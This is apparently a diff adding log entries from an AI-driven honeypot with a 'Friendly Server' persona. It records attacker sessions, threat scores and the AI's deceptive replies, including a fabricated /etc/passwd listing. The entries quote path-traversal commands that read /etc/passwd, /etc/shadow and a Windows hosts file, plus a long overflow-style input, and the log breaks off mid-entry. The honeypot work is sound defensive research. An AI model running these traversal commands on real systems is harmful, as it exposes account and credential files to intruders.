+    "ai_decision": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug Reporting:/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:Systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:101:103:Systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:102:106:D-Bus Message Bus:/nonexistent:/usr/sbin/nologin\nsyslog:x:103:110:Syslog:/home/syslog:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:111:UUID Daemon:/run/uuidd:/usr/sbin/nologin\ntcpdump:x:106:112::/nonexistent:/usr/sbin/nologin\ntss:x:107:113:TPM Software Stack:/var/lib/tpm:/bin/false\nlandscape:x:108:114:Landscape Client:/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1:Pollinate:/var/cache/pollinate:/bin/false\nmysql:x:110:115:MySQL Server:/nonexistent:/bin/false\npostgres:x:111:116:PostgreSQL Administrator:/var/lib/postgresql:/bin/bash\nredis:x:112:117:Redis Server:/var/lib/redis:/usr/sbin/nologin\ndocker:x:113:118:Docker Engine:/var/lib/docker:/usr/sbin/nologin\nnginx:x:114:119:Nginx Service:/var/cache/nginx:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu User:/home/ubuntu:/bin/bash\ndev:x:1001:1001:Developer:/home/dev:/bin/bash\nadmin:x:1002:1002:System Administrator:/home/admin:/bin/bash\nsupport:x:1003:1003:Support Engineer:/home/support:/bin/bash\nbackupuser:x:1004:1004:Backup Operator:/home/backupuser:/bin/bash",
+    "confidence_score": 0.9,
+    "conversation_metadata": {
+        "conversation_id": "9b66e74f",
+        "interaction_count": 3
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.9
+    },
+    "risk_score": 7,
+    "threat_level": "LOW"
+}
+2026-07-23 17:12:19,905 - {
+    "session_id": "9b66e74f",
+    "conversation_log": "Attacker executed: cat ../../../etc/passwd",
+    "ai_decision": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug Reporting:/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:Systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:101:103:Systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:102:106:D-Bus Message Bus:/nonexistent:/usr/sbin/nologin\nsyslog:x:103:110:Syslog:/home/syslog:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:111:UUID Daemon:/run/uuidd:/usr/sbin/nologin\ntcpdump:x:106:112::/nonexistent:/usr/sbin/nologin\ntss:x:107:113:TPM Software Stack:/var/lib/tpm:/bin/false\nlandscape:x:108:114:Landscape Client:/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1:Pollinate:/var/cache/pollinate:/bin/false\nmysql:x:110:115:MySQL Server:/nonexistent:/bin/false\npostgres:x:111:116:PostgreSQL Administrator:/var/lib/postgresql:/bin/bash\nredis:x:112:117:Redis Server:/var/lib/redis:/usr/sbin/nologin\ndocker:x:113:118:Docker Engine:/var/lib/docker:/usr/sbin/nologin\nnginx:x:114:119:Nginx Service:/var/cache/nginx:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu User:/home/ubuntu:/bin/bash\ndev:x:1001:1001:Developer:/home/dev:/bin/bash\nadmin:x:1002:1002:System Administrator:/home/admin:/bin/bash\nsupport:x:1003:1003:Support Engineer:/home/support:/bin/bash\nbackupuser:x:1004:1004:Backup Operator:/home/backupuser:/bin/bash",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Privilege Enumeration",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:12:34,785 - {
+    "session_id": "94e6b666",
+    "query": "cat %2e%2e%2f%2e%2e%2fetc%2fshadow",
+    "response": "bash: cat: %2e%2e%2f%2e%2e%2fetc%2fshadow: No such file or directory",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 1,
+            "services_accessed": 0,
+            "engagement_score": 6,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "cat %2e%2e%2f%2e%2e%2fetc%2fshadow"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:12:34,785 - {"session_id": "94e6b666", "command": "cat %2e%2e%2f%2e%2e%2fetc%2fshadow", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:12:34,785 - {
+    "session_id": "94e6b666",
+    "command": "cat %2e%2e%2f%2e%2e%2fetc%2fshadow",
+    "ai_decision": "bash: cat: %2e%2e%2f%2e%2e%2fetc%2fshadow: No such file or directory",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "94e6b666",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:12:34,785 - {
+    "session_id": "94e6b666",
+    "conversation_log": "Attacker executed: cat %2e%2e%2f%2e%2e%2fetc%2fshadow",
+    "ai_decision": "bash: cat: %2e%2e%2f%2e%2e%2fetc%2fshadow: No such file or directory",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:12:49,883 - {
+    "session_id": "297460bb",
+    "query": "type ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "response": "bash: type: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts: No such file or directory",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "type ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:12:49,883 - {"session_id": "297460bb", "command": "type ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:12:49,883 - {
+    "session_id": "297460bb",
+    "command": "type ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "ai_decision": "bash: type: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts: No such file or directory",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "297460bb",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:12:49,887 - {
+    "session_id": "297460bb",
+    "conversation_log": "Attacker executed: type ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "ai_decision": "bash: type: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts: No such file or directory",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:13:05,755 - {
+    "session_id": "9b66e74f",
+    "query": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "response": "Welcome to Friendly Server! \n\nFriendly Server:~$ /bin/bash /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 8,
+        "risk_level": "LOW",
+        "final_score": 8,
+        "threat_level": "LOW",
+        "base_score": 8,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
